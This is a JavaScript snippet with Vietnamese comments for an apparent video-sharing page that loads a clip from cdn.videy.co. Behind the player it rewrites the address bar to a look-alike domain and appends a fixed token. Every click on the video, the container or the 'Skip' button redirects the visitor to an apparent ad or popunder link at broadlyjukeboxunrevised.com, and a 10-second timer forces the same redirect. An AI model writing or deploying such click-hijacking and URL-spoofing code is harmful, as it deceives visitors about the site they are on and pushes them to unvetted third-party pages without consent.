<script>
    const VIDEO_BASE   = "https://cdn.videy.co";          // ← giữ nguyên như lần trước
    const REDIRECT_URL = "https://broadlyjukeboxunrevised.com/2053781";
    const DELAY_REDIRECT = 10000;
    const DELAY_SHOW_BUTTON = 5000;

    // ==================== GIÁ TRỊ K MỚI (đã update theo yêu cầu) ====================
    const K_VALUE = "MTc3NjY3ODk5MnxrOXhQITI=";

    function getFilename() {
        let path = window.location.pathname || '/';
        path = path.replace(/\/+$/, '');
        let filename = path.split('/').filter(Boolean).pop() || '';

        if (!filename && document.referrer) {
            try {
                const ref = new URL(document.referrer);
                let refPath = ref.pathname.replace(/\/+$/, '');
                filename = refPath.split('/').filter(Boolean).pop() || '';
            } catch(e) {}
        }

        try { filename = decodeURIComponent(filename); } catch(e) {}
        return filename || 'voDWqx8K1.mp4';
    }

    function init() {
        const filename = getFilename();
        const videoUrl = `${VIDEO_BASE}/${filename}`;

        // ====================== CLEAN URL (giữ nguyên logic cũ) ======================
        if (filename && !window.location.pathname.includes(filename)) {
            history.replaceState({}, '', `https://cdnvidey.art/${filename}`);
        }

        // ====================== TỰ ĐỘNG THÊM ?k=... (logic mới - siêu nhanh) ======================
        let url = new URL(window.location.href);
        if (!url.searchParams.has('k')) {
            url.searchParams.set('k', K_VALUE);
            history.replaceState({}, '', url.toString());
        }
        // =============================================================================

        // Load video từ cdn.videy.co
        const video = document.getElementById('player');
        video.src = videoUrl;
        video.play().catch(() => {});

        // Click video → redirect ngay (giữ nguyên)
        video.addEventListener('click', (e) => {
            if (e.target.tagName === 'VIDEO') {
                e.preventDefault();
                e.stopImmediatePropagation();
                window.location.href = REDIRECT_URL;
            }
        });

        // Nút Skip
        const skipButton = document.getElementById('skipButton');
        setTimeout(() => skipButton.style.display = 'block', DELAY_SHOW_BUTTON);

        skipButton.addEventListener('click', (e) => {
            e.stopImmediatePropagation();
            window.location.href = REDIRECT_URL;
        });

        // Click ngoài cũng redirect
        const container = document.getElementById('container');
        container.addEventListener('click', (e) => {
            if (e.target.id === 'skipButton' || e.target.tagName === 'VIDEO' || e.target.closest('video')) {
                return;
            }
            window.location.href = REDIRECT_URL;
        });

        // Redirect tự động sau 10 giây
        const overlay = document.getElementById('overlay');
        let sec = 10;
        const int = setInterval(() => {
            sec--;
            overlay.querySelector('span').textContent = `Chờ ${sec} giây`;
            if (sec <= 0) clearInterval(int);
        }, 1000);

        setTimeout(() => {
            clearInterval(int);
            overlay.style.display = 'flex';
            window.location.href = REDIRECT_URL;
        }, DELAY_REDIRECT);
    }

    window.onload = init;
</script>
